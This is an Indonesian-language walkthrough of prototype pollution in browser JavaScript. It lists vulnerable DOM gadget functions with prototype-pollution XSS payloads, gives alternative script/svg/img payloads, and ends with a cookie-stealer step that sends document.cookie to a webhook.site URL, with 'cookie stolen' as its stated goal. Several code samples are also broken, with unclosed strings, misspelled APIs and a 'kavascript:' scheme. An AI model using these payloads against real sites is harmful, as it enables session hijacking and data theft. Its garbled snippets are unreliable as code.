# 📋 **STEP BY STEP PROTOTYPE POLLUTION**

---

## **Cek apakah bisa terjadi pollution**

**Action:** Buka console browser (F12)

### Buat object:

```javascript
let a = {};
a.__proto__.zen = "zen";
```

Kemudian cek:

```javascript
({}).__proto__
```

---

## **Harapan output:**

```js
Object { zen: "zen", … }
__defineGetter__: function __defineGetter__()
__defineSetter__: function __defineSetter__()
__lookupGetter__: function __lookupGetter__()
__lookupSetter__: function __lookupSetter__()
__proto__:
constructor: function Object()
hasOwnProperty: function hasOwnProperty()
isPrototypeOf: function isPrototypeOf()
propertyIsEnumerable: function propertyIsEnumerable()
toLocaleString: function toLocaleString()
toString: function toString()
valueOf: function valueOf()
zen: "zen"
<get __proto__()>: function __proto__()
<set __proto__()>: function __proto__()
```

Dari output ini kita bisa lihat ada properti `zen: "zen"` yang sudah muncul di dalam object.

Ini menunjukkan bahwa prototype pollution berhasil terjadi, karena properti yang kita injeksikan ikut terbawa ke prototype object yang berjalan di memory. Akibatnya, semua object yang mewarisi prototype tersebut bisa ikut terpengaruh selama runtime aplikasi.

---

## **Verifikasi pollution berhasil**

```javascript
console.log({}.zen);
```

**Harapan output:** `"zen"` (bukan `undefined`)

---
## **Pollution ke property berbahaya**

Sekarang yang perlu kita lakukan adalah menemukan titik yang rentan. Kita perlu mencari gadget chain yang bisa kita gunakan untuk prototype pollution, baik melalui metode HTTP, parameter, atau nilai apa pun yang kemudian diproses oleh aplikasi.

Intinya, kita mencari alur di mana input tersebut akhirnya digunakan untuk menulis ke DOM atau mempengaruhi logika aplikasi.

Sebagai contoh, misalnya ada input dari query parameter yang kemudian di-merge ke object aplikasi tanpa filtering. Jika parameter tersebut bisa memodifikasi prototype, maka nilai tersebut bisa ikut tersebar ke object lain yang digunakan di rendering DOM atau logic aplikasi.

Dari situ kita bisa mulai melihat apakah pollution tersebut punya dampak nyata, bukan hanya sekadar perubahan di memory object saja.

### Vulnarable Gadget Chains (Exploitables Code):

---

### Gadget 1: innerHTML with missing property check

```js
function renderUserProfile(){
  const user ={};
  const container = document.getElementById('gadgetOutput');
  // vulnarable: access 'bio' withiut checking if it exists
  container.innerHTML = '<div>Bio: ' + user.bio + '</div>;
}
```
> Exploit: `__proto__[bio]=<img src=x onerror=alert('XSS')>`


---

### Gadget 2: Attribute assignment without validation


```js
function loadUserSettings(){
  const config = {};
  const link = document.createElement('a');
  // vulnarable: sets href from polluted property
  link.href = config.redirectUrl || '#';
  link.textContent = 'Click Here';
  document.getElementById('gadgetOutput').appendChild(link);
}
```

> Exploit : `__proto__[redirectUrl]=kavascript:alert('XSS')`

```js
function renderImage(user){
  const img = document.createElement('img');
  const container = document.getElementById('gadgetOutput');

  // vulnerable: directly assigning object property to DOM attribute
  img.src = user.avatar;

  container.appendChild(img);
}
```

> Exploit :

---

### Gadget 3: Template strings with object property

```js
function displayNotifications(){
  const notifications = {};
  const template = '<div class="alert">${notification.message}</div>';
  // Vulnarable : uses polluted property in template
  document.getElementById('gadgetOutput').innerHTML = template;
}
```

> Exploit : `__proto__[message]=<img src=x onerror=alert('XSS')>`

```js
function renderMessage(user){
  const container = document.getElementById('gadgetOutput');

  // vulnerable: unsafe interpolation of object property
  container.innerHTML = `<div>Message: ${user.message}</div>`;
}
```

---

### Gadget 4: Event handler from object property


```js
function initializeWidget(){
  const widget = {};
  const button = document.createElement('button');
  button.textContent 'Widget Action';
  // Vulnerable: uses polluted property as event handler
  if (widget.onClick){
    button.onClick = new Function(widget.onClick);
  }
  document.getEmelentById('gadgetOutput').appendChild(button);
}
```

> Exploit :` __proto__[onClick]=alert('XSS')`

```js
function renderButton(user){
  const btn = document.createElement('button');
  const container = document.getElementById('gadgetOutput');

  // vulnerable: assigning event handler from user-controlled property
  btn.onclick = user.onClick;

  btn.innerText = "Click me";
  container.appendChild(btn);
}
```

---

Dari semua gadget di atas, pola utamanya adalah ketika properti dari object (yang bisa dipengaruhi oleh prototype pollution) langsung dipakai tanpa validasi, dan akhirnya masuk ke DOM atau event handler, sehingga bisa membuka jalan ke XSS atau logic manipulation.



---



```javascript
Object.prototype.innerHTML = "<img src=x onerror=alert(1)>"
```
**Harapan:** Output `"<img src=x onerror=alert(1)>"`

---

### **STEP 4: Trigger gadget (refresh halaman)**
**Action:** Refresh halaman `F5` atau `Ctrl+R`

**Hasil yang diharapkan:**
- Halaman jadi **blank putih**
- Muncul error **"something went wrong"**
- Atau **alert popup** (kalau beruntung)

---

### **STEP 5: Fine-tuning payload (kalau blank)**
Ganti payload satu per satu:

```javascript
// Payload alternatif 1
Object.prototype.innerHTML = "<script>alert(1)</script>"

// Payload alternatif 2
Object.prototype.innerHTML = "<svg/onload=alert(1)>"

// Payload alternatif 3
Object.prototype.innerText = "<img src=x onerror=alert(1)>"
```
**Action:** Refresh setelah setiap payload

---

### **STEP 6: Eksekusi (kalau alert muncul)**
Ganti payload jadi cookie stealer:

```javascript
Object.prototype.innerHTML = "<script>fetch('https://webhook.site/YOUR_ID?c=' + document.cookie)</script>"
```
**Harapan:** Cookie lo terkirim ke webhook

---

## 📊 **TARGET HASIL AKHIR**

| Tahap | Status | Tanda keberhasilan |
|-------|--------|-------------------|
| Pollution | ✅ | `{}.zen` = `"zen"` |
| Gadget trigger | ✅ | Halaman blank/error |
| Alert popup | ✅ | Munkot alert box |
| Cookie stolen | ✅ | Data masuk ke webhook |

---

## ⚠️ **CATATAN PENTING**

1. **Blank putih** = gadget ketemu, tapi payload error
2. **Alert muncul** = lo bisa lanjut ke cookie stealer
3. **Tidak ada perubahan** = pollution gagal atau gadget beda

